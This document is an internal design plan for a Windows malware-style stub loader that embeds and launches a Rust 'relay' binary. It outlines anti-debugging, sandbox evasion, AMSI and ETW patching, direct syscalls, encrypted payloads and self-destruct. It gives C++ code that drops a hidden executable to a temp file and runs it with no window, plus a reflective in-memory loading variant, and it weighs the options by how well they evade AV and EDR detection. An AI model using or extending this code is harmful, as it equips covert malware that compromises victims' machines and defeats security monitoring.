# Stub Integration Plan — Load Rust Binary from `nixon_stub.cpp`

> **HISTORICAL / NOT CURRENT.**  This plan was written against
> `nixon_stub.cpp`, which no longer exists in the tree.  The native
> stubs are now `native/stub_win.cpp` and `native/stub_linux.cpp`, and
> the Rust relay crate lives in `relay/` (not `orbital-relay/`).  The
> line references below (`nixon_stub.cpp:1204-1480`,
> `ReflectiveLoader::LoadPEFromMemory`, `cd orbital-relay`) are stale and
> are kept only as a record of the original design.  For the current
> native surface see `docs/PLATFORMS.md` and `native/`.

## 1. Current Architecture (Python Payload Loading)

`nixon_stub.cpp:1204-1480` (`main()`) runs a state machine (`state` variable `0x10` → `0xFF`):

| State | Action |
|-------|--------|
| `0x10` | `InitDynamicAPI()` — resolve Win32 API pointers via PEB-walking + FNV-1a hash lookup |
| `0x20` | Wipe PE header of own module |
| `0x30` | Spawn `WatchdogThread` (anti-debug loop) |
| `0x40` | `RunAllAntiAnalysis()` — PEB flags, HW breakpoints, debug port, timing, sandbox/VM checks |
| `0x50` | Hardware fingerprint → derive `machineKey[32]` + `rc4HardwareKey[32]` |
| `0x60` | `InitHellsGate(hg)` — parse ntdll from disk, extract syscall numbers, generate syscall stubs on an executable page |
| `0x70` | `DecodeStringArray()` — decode dictionary-encoded obfuscated bytes → `payloadData` |
| `0x80` | Copy `payloadData` into `SecureEnclave::ProtectedBuffer` |
| `0x90` | Decrypt enclave: Whitebox AES-128-CTR then RC4 (hardware-derived keys) |
| `0xA0` | `PatchAMSI()` + `PatchETW()` + `InstallHardwareHooks()` (VEH + HW breakpoints on critical functions) |
| `0xA5` | Decompress zlib-compressed Python DLL (`NIXON_PYTHON_DLL`), `ReflectiveLoader::LoadPEFromMemory()` → map it in-memory, resolve Python C API exports |
| `0xB0` | Call `Py_Initialize()`, set flags (optimize, no site, no bytecode) |
| `0xC0` | `PyMarshal_ReadObjectFromString()` → deserialize, `PyEval_EvalCode()` → execute Python payload |
| `0xD0` | Self-destruct: wipe function bodies, TLS callbacks, terminate watchdog, `ExitProcess(0)` |

**Key functions:**

- `ReflectiveLoader::LoadPEFromMemory()` (`nixon_stub.cpp:955-1054`) — full reflective PE loader that maps a PE32+ image, processes base relocations, resolves imports via `LoadLibraryA`/`GetProcAddress`. Supports both manual `VirtualAlloc` and HellsGate `NtAllocateVirtualMemory` fallback.
- `HellsGate::InitHellsGate()` (`nixon_stub.cpp:848-946`) — reads ntdll.dll from disk, finds `syscall; ret` gadgets, generates 38-byte per-function stubs with inline syscall numbers.
- `payload.h` — auto-generated header containing obfuscated payload data as C++ arrays (`NIXON_WORD_ARRAY`, `NIXON_DICT`, `NIXON_PYTHON_DLL`).

---

## 2. Integration Approaches

### Option A: Extract-to-Disk + CreateProcess (Recommended — SIMPLEST)

**Description:** Embed the Rust PE binary (compressed with zlib) as a byte array in `payload.h`. At runtime, decompress, write to a temp file via Win32 APIs (`GetTempPathA`, `GetTempFileNameA`, `CreateFileA`, `WriteFile`), then execute via `CreateProcessA`.

**Pros:**
- Zero changes to the Rust binary's compilation model — compile as a normal Windows EXE (`x86_64-pc-windows-gnu` or `x86_64-pc-windows-msvc`)
- Minimal code changes to stub (~50-80 lines)
- The Rust binary can be complex (async, tokio, threads, sockets) — no restrictions
- The stub's existing anti-forensics (self-delete, PE header wipe) still applies

**Cons:**
- Writes to disk (temp file) — detectable by AV/EDR behavioral monitoring
- Child process is visible in process tree
- Temp file may persist if stub crashes before cleanup

**Recommended for:** First integration, quick proof-of-concept, scenarios where disk write is acceptable.

### Option B: Reflective PE Load (Stealthier, No Disk Write)

**Description:** Embed the Rust binary as a position-independent PE (PIE/`/DYNAMICBASE`), then load it with the existing `ReflectiveLoader::LoadPEFromMemory()` already used for the Python DLL.

**Pros:**
- Never touches disk — fully memory-backed
- No child process — executes in-stub address space (or in a spawned thread within the same process)
- Reuses existing HellsGate infrastructure
- Harder to detect (no file creation events)

**Cons:**
- **Significant Rust binary constraints:**
  - Must compile as a `cdylib` (DLL), not an EXE — requires a `#[no_mangle] pub extern "C" fn entry_point()` as the DllMain equivalent
  - OR compile as a staticlib with a known entry point, but this needs a custom linker script
  - Cannot use `std::process::exit()`, global destructors, or TLS in the normal Rust sense
  - Async runtimes (tokio) may fail or need careful initialization in a loaded-DLL context
  - The Rust stdlib assumes it's loaded as the main EXE — things like `env::args()`, `std::io::stdin()` may panic
- The Rust `x86_64-pc-windows-gnu` target generates PE+ with relocations by default (`/DYNAMICBASE`), so `LoadPEFromMemory()` can rebase it — but the import resolution and TLS callbacks need validation
- Complex runtime issues are likely with standard Rust binary patterns

**Recommended for:** Advanced integration after Option A is proven, or when disk-write avoidance is critical.

### Option C (Hybrid — Not Recommended)

Extract to a named pipe or a section-backed file mapping (`CreateFileMapping` + `MapViewOfFile`) and have the Rust binary read from it. Adds complexity without clear benefit over Option A or B.

---

## 3. Required Changes to `nixon_stub.cpp`

### 3.1 New `payload.h` Arrays (for both A and B)

Add to `payload.h`:

```c
constexpr size_t NIXON_RUST_COMPRESSED_LEN = <auto-gen>;
constexpr size_t NIXON_RUST_ORIGINAL_LEN   = <auto-gen>;
const uint8_t NIXON_RUST_BINARY[1] = { 0x00 };  // zlib-compressed Rust PE
```

Update `scripts/build.py` / the payload generation script (currently `obfuscator/core.py`) to:
1. Read the compiled `orbital-relay.exe` (from `relay-win` Makefile target)
2. Compress with zlib
3. Emit `NIXON_RUST_COMPRESSED_LEN`, `NIXON_RUST_ORIGINAL_LEN`, `NIXON_RUST_BINARY[]`

### 3.2 Option A — Extract + CreateProcess

Add a new state (e.g., `0x95`) in the state machine, between enclave decryption (`0x90`) and AMSI patching (`0xA0`):

```cpp
case 0x95: {  // Rust PE: extract to temp and execute
    if (NIXON_RUST_COMPRESSED_LEN > 0) {
        // 1. Decompress
        SecureVector rustRaw(NIXON_RUST_ORIGINAL_LEN);
        uLongf rawLen = NIXON_RUST_ORIGINAL_LEN;
        if (uncompress(rustRaw.data(), &rawLen,
                       NIXON_RUST_BINARY, NIXON_RUST_COMPRESSED_LEN) == Z_OK) {
            // 2. Get temp path and create temp file
            char tempPath[MAX_PATH + 1] = {0};
            GetTempPathA(MAX_PATH, tempPath);
            char tempFile[MAX_PATH + 1] = {0};
            GetTempFileNameA(tempPath, "NXN", 0, tempFile);

            // 3. Write decompressed bytes to temp file
            HANDLE hFile = CreateFileA(tempFile, GENERIC_WRITE, 0, NULL,
                                       CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD written;
                WriteFile(hFile, rustRaw.data(), rustRaw.size(), &written, NULL);
                CloseHandle(hFile);

                // 4. Execute as child process (hidden window)
                STARTUPINFOA si = { sizeof(si) };
                PROCESS_INFORMATION pi = {0};
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                CreateProcessA(tempFile, NULL, NULL, NULL, FALSE,
                               CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                // Optionally: CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                // or wait via WaitForSingleObject(pi.hProcess, timeout)
            }

            // 5. Optional: delete temp file after process exits
            // DeleteFileA(tempFile);
        }
    }
    // Wipe decompressed buffer
    volatile unsigned char* w = rustRaw.data();
    for (size_t i = 0; i < rustRaw.size(); i++) w[i] = 0;
    state = 0xA0;
    break;
}
```

**APIs needed** (use dynamic resolution or the already-resolved `g_api` pattern):
- `GetTempPathA` (kernel32)
- `GetTempFileNameA` (kernel32)
- `CreateFileA` (already available via the HellsGate/import resolution pattern)
- `WriteFile` (kernel32)
- `CloseHandle` (already in `g_api`)
- `CreateProcessA` (kernel32)
- `DeleteFileA` (kernel32, optional cleanup)

### 3.3 Option B — Reflective PE Load

Also add a new state (`0x95`), but instead of file I/O:

```cpp
case 0x95: {  // Rust PE: reflective load
    if (NIXON_RUST_COMPRESSED_LEN > 0) {
        SecureVector rustRaw(NIXON_RUST_ORIGINAL_LEN);
        uLongf rawLen = NIXON_RUST_ORIGINAL_LEN;
        if (uncompress(rustRaw.data(), &rawLen,
                       NIXON_RUST_BINARY, NIXON_RUST_COMPRESSED_LEN) == Z_OK) {
            // Reuse the existing reflective loader
            PVOID rustEntry = ReflectiveLoader::LoadPEFromMemory(hg, rustRaw.data(), rawLen);
            if (rustEntry) {
                // Cast to function pointer and call
                typedef int (*fnRustEntry)(void);
                fnRustEntry rustMain = (fnRustEntry)rustEntry;
                // Spawn a thread for it to keep the main state machine alive
                if (g_api.pCreateThread) {
                    g_api.pCreateThread(NULL, 0,
                        (LPTHREAD_START_ROUTINE)rustMain, NULL, 0, NULL);
                }
            }
        }
    }
    volatile unsigned char* w = rustRaw.data();
    for (size_t i = 0; i < rustRaw.size(); i++) w[i] = 0;
    state = 0xA0;
    break;
}
```

No new APIs needed — everything is already in `ReflectiveLoader::LoadPEFromMemory()`.

---

## 4. Required Changes to the Rust Binary

### 4.1 Option A — Normal Windows EXE

**No Rust code changes required.** Just compile with:

```bash
cd orbital-relay && cargo build --release --target x86_64-pc-windows-gnu
```

The resulting `orbital-relay.exe` is a standard PE32+ executable. It gets compressed and embedded as-is.

Update the Makefile `relay-win` target to also copy the binary to a known location for the payload generation script:

```makefile
relay-win: $(BUILD_DIR)
    cd $(RELAY_DIR) && rustup target add x86_64-pc-windows-gnu 2>/dev/null || true
    cd $(RELAY_DIR) && cargo build --release --target x86_64-pc-windows-gnu
    cp $(RELAY_DIR)/target/x86_64-pc-windows-gnu/release/orbital-relay.exe \
       $(BUILD_DIR)/orbital-relay-win.exe
```

Then the payload generation script reads `build/orbital-relay-win.exe`.

### 4.2 Option B — Reflective PE Load (DLL/cdylib)

**Rust changes required:**

1. **`Cargo.toml`** — add a `[lib]` section for a cdylib:

```toml
[lib]
name = "orbital_relay"
crate-type = ["cdylib"]
```

2. **`src/lib.rs`** — provide a C-compatible entry point:

```rust
#[no_mangle]
pub extern "C" fn orbital_relay_entry() -> i32 {
    // Your existing main logic, refactored into this function
    // No std::process::exit(), no global destructors that assume EXE context
    // Must handle all init (e.g., tokio::runtime::Runtime) inside this call
    0
}
```

3. **`src/main.rs`** (optional, for standalone testing):

```rust
fn main() {
    orbital_relay_entry();
}
```

4. **Compile as DLL:**

```bash
cd orbital-relay && cargo build --release --target x86_64-pc-windows-gnu
# Output: orbital-relay/target/x86_64-pc-windows-gnu/release/orbital_relay.dll
```

5. **Compile flags for better reflective-load compatibility:**

In `.cargo/config.toml`:
```toml
[target.x86_64-pc-windows-gnu]
rustflags = ["-C", "link-args=/DYNAMICBASE"]
```

6. **Known Rust stdlib issues under reflective load:**
   - `env::args()` may crash (no argc/argv in loaded-DLL context)
   - `std::io::stdin()` / `std::io::stdout()` may be unavailable
   - TLS destructors registered via `#[thread_local]` may not fire
   - Panic unwinding may fail — use `panic = "abort"` in `Cargo.toml`
   - Consider adding a `#![no_std]` core if the relay logic allows, but for a tokio-based relay this is impractical

---

## 5. Implementation Effort Estimate

| Component | Hours | Details |
|-----------|-------|---------|
| **Option A — Stub changes** | 1–2 | Write new state `0x95`, add temp-file extraction + CreateProcess. Integrate into state machine. |
| **Option A — Payload generation** | 0.5–1 | Update `build.py`/`15(14).py` to compress and embed `orbital-relay.exe` into `payload.h` |
| **Option A — Build system** | 0.5 | Ensure `make relay-win` produces the binary consumable by the payload gen script |
| **Option A — Testing** | 1–2 | Verify extraction runs, binary executes correctly, no AV triggers on temp file |
| **Option A Total** | **3–5** | |
| | | |
| **Option B — Rust cdylib** | 2–4 | Refactor `main()` into `extern "C" fn`, handle stdlib limitations, validate no panics |
| **Option B — Stub changes** | 1–2 | Add state `0x95` with decompress + `LoadPEFromMemory()` call + `CreateThread` launch |
| **Option B — Testing** | 3–5 | Validate import resolution, relocations, TLS, tokio runtime in loaded-DLL context |
| **Option B — Debugging** | 2–4 | Fix Rust stdlib assumptions, handle edge cases (panic = abort, env access, etc.) |
| **Option B Total** | **8–15** | |
| | | |
| **Payload generation script** | 1 | Shared between A and B — read the compiled binary, compress with zlib, emit C array |
| **Documentation/ROADMAP update** | 0.5 | Update `ROADMAP.md` with integration status |

---

## 6. Windows vs Linux Considerations

- **`nixon_stub.cpp` is Win32-only** — uses `windows.h`, `winternl.h`, PEB walking, HellsGate syscalls, VEH, TLS callbacks, `__readgsqword`, `__cpuid`, etc.
- The `orbital-relay` Rust binary already cross-compiles for Linux x86_64, Linux ARM64, and Windows x86_64 (see `Makefile` targets `relay`, `relay-win`, `relay-linux-arm`).
- **Only the Windows Rust binary** (`x86_64-pc-windows-gnu`) is relevant for stub integration.
- The Linux "nixon core" (`nixon_core.cpp`) and Linux Rust relay are separate execution paths, not covered here.

---

## Recommendation

**Implement Option A first** (extract-to-disk + CreateProcess). It requires minimal changes to both the stub and the Rust binary, has predictable behavior, and can be completed in ~3–5 hours. The temporary file can be deleted immediately after execution. If disk-write detection becomes a problem, the Option B reflective load path can be added later, reusing the same decompression and embedding infrastructure.

If Option B is pursued later, pay special attention to:
- Rust stdlib TLS initialization (the Rust runtime calls `LdrRegisterDllNotification` during `main()` initialization — may not fire in a reflectively-loaded DLL)
- Using `std::panic::catch_unwind()` around the entry point
- Testing with a minimal "hello world" Rust DLL first, then progressively adding tokio/socket code
